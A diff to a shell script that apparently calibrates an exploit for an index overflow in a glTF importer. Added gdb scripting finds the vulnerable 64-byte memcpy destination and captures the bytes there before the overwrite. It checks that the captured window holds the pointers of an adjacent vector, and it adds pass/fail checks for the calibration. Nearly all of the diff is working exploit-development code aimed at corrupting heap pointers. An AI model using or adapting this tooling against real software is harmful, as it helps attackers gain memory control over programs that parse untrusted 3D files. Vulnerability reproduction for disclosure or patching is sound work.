@@ -61,6 +61,16 @@ printf 'BASE bytes=%s\n' "$base_len" >>"$trace"
 
 # Own vector and its stack address, measured twice; mismatch fails rather
 # than producing a control calibrated against a different allocation.
+for i in 1 2; do
+    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
+        -ex "break $pre_bp" -ex run \
+        -ex 'print/x meshes._M_impl._M_start' \
+        -ex 'print/x meshes._M_impl._M_finish' \
+        -ex 'print/x meshes._M_impl._M_end_of_storage' \
+        -ex 'print &meshes' \
+        --args "$driver" w19/evidence/base.gltf \
+        >"w19/evidence/own-$i.out" 2>&1 || true
+done
 python3 - <<'PY' >w19/evidence/calibration.out
 import pathlib, re
 def vals(p):
@@ -80,18 +90,38 @@ PY
 cat w19/evidence/calibration.out >>"$trace"
 cal=$(cat w19/evidence/calibration.out)
 own_begin=$(python3 -c "print('$cal'.split()[1].split('=')[1])")
-dest=$(python3 -c "print('$cal'.split()[5].split('=')[1])")
 
-# Capture the exact 64 bytes at the vulnerable memcpy destination, before
-# the overwrite. A window taken earlier at :314 is stale in two bytes and
-# produces a corrupt-pointer abort; this call-site capture is self-calibrating.
+# Discover the vulnerable destination instead of deriving it from the vector
+# address: that offset varies with the driver path and environment. The last
+# 64-byte memcpy before the import fault is the index overflow.
+cat >w19/evidence/discover.gdb <<'GDB'
+set disable-randomization on
+start
+break memcpy@plt if $rdx == 64
+commands
+silent
+printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx
+continue
+end
+continue
+GDB
+gdb -q -batch -x w19/evidence/discover.gdb --args "$driver" w19/evidence/base.gltf \
+    >w19/evidence/discover.out 2>&1 || true
+dest=$(grep '^DST=' w19/evidence/discover.out | tail -1 | awk '{print $1}' | cut -d= -f2)
+[ -n "$dest" ] || { echo 'FAIL no 64-byte memcpy destination discovered' | tee -a "$log"; exit 1; }
+printf 'DISC last_64byte_memcpy dest=%s\n' "$dest" >>"$trace"
+
+# Capture the exact 64 bytes at that destination before the overwrite. A
+# window taken earlier at :314 is stale in two bytes and produces a
+# corrupt-pointer abort; this call-site capture is self-calibrating.
 gdb -q -batch -ex 'set disable-randomization on' -ex start \
     -ex "break memcpy@plt if \$rdi == $dest && \$rdx == 64" \
     -ex continue -ex 'printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx' \
     -ex 'x/64bx $rdi' --args "$driver" w19/evidence/base.gltf \
     >w19/evidence/window-gdb.out 2>&1 || true
-python3 - <<'PY' >w19/evidence/window.out
-import pathlib, re, hashlib
+python3 - "$own_begin" >w19/evidence/window.out <<'PY'
+import pathlib, re, hashlib, sys
+own = int(sys.argv[1], 16)
 t = pathlib.Path('w19/evidence/window-gdb.out').read_text()
 assert 'DST=' in t, 'vulnerable memcpy was not reached'
 rows = [l for l in t.splitlines() if re.match(r'^0x[0-9a-f]+:\s', l)]
@@ -101,8 +131,10 @@ for l in rows:
     bs += [int(x, 16) for x in re.findall(r'\b0x([0-9a-f]{2})\b', l)]
 assert len(bs) == 64, f'expected 64 bytes, got {len(bs)}'
 win = bytes(bs)
+low = int.from_bytes(win[12:16], 'little')
+assert low == (own & 0xffffffff), f'window begin low {low:#x} != own {own:#x}'
 pathlib.Path('w19/evidence/window.hex').write_text(win.hex() + '\n')
-print('WIN bytes=64 sha256=%s begin=%s finish=%s cap=%s' % (
+print('WIN bytes=64 sha256=%s begin=%s finish=%s cap=%s begin_low_matches_own=1' % (
     hashlib.sha256(win).hexdigest(), win[12:20].hex(), win[20:28].hex(),
     win[28:36].hex()))
 PY
@@ -165,6 +197,8 @@ rc=0
 printf 'NEG plain rc=%s\n' "$rc" >>"$trace"
 printf 'FOLLOW count=%s expected=4\n' "$(grep -c 'follows=1' "$trace" || true)" >>"$trace"
 
+check 'vulnerable memcpy destination discovered' 'DISC last_64byte_memcpy dest='
+check 'captured window matches own vector' 'begin_low_matches_own=1'
 check 'source hashes pinned' 'glTFAsset.inl'
 check 'input length fixed' 'BASE bytes=1246'
 check 'calibration stable across two measurements' 'stable=1'
